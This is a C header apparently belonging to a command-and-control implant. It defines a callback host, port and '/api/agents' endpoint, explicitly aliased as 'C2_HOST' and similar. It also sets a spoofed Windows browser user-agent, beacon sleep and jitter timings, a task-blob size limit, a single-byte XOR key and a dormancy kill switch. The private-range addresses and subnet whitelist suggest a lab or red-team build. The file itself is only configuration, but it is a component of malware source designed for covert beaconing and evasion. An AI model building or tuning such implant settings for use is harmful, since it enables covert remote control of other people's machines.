#ifndef CONFIG_H
#define CONFIG_H

#if __has_include("config.local.h")
#include "config.local.h"
#endif

/* ── Callback ─────────────────────────────────────────────────────── */
#ifndef CALLBACK_HOST
#define CALLBACK_HOST L"192.168.1.69"
#endif
#ifndef CALLBACK_PORT
#define CALLBACK_PORT 8443
#endif
#ifndef CALLBACK_ENDPOINT
#define CALLBACK_ENDPOINT L"/api/agents"
#endif
#ifndef CALLBACK_USERAGENT
#define CALLBACK_USERAGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
#endif

/* ── Legacy aliases ───────────────────────────────────────────────── */
#define C2_HOST CALLBACK_HOST
#define C2_PORT CALLBACK_PORT
#define C2_ENDPOINT CALLBACK_ENDPOINT
#define C2_USERAGENT CALLBACK_USERAGENT

/* ── Timing ───────────────────────────────────────────────────────── */
#ifndef SLEEP_INTERVAL_MS
#define SLEEP_INTERVAL_MS 30000
#endif
#ifndef JITTER_PERCENT
#define JITTER_PERCENT 20
#endif

/* ── Network ──────────────────────────────────────────────────────── */
#ifndef READ_CHUNK_SIZE
#define READ_CHUNK_SIZE 4096
#endif
#ifndef MAX_TASK_BLOB_SIZE
#define MAX_TASK_BLOB_SIZE (1024 * 1024)
#endif

/* ── IP Whitelist ─────────────────────────────────────────────────── */
#ifndef WHITELIST_SUBNET_START
#define WHITELIST_SUBNET_START "192.168.1.1"
#endif
#ifndef WHITELIST_SUBNET_END
#define WHITELIST_SUBNET_END "192.168.1.254"
#endif

/* ── Identity ─────────────────────────────────────────────────────── */
#ifndef AGENT_ID_PREFIX
#define AGENT_ID_PREFIX "AGENT"
#endif

/* ── Crypto ───────────────────────────────────────────────────────── */
#ifndef SESSION_KEY_SEED_LEN
#define SESSION_KEY_SEED_LEN 32
#endif
#ifndef XOR_KEY
#define XOR_KEY 0x55
#endif

/* ── Kill switch ──────────────────────────────────────────────────── */
#ifndef KILLSWITCH_DORMANT_DAYS
#define KILLSWITCH_DORMANT_DAYS 7
#endif

#endif /* CONFIG_H */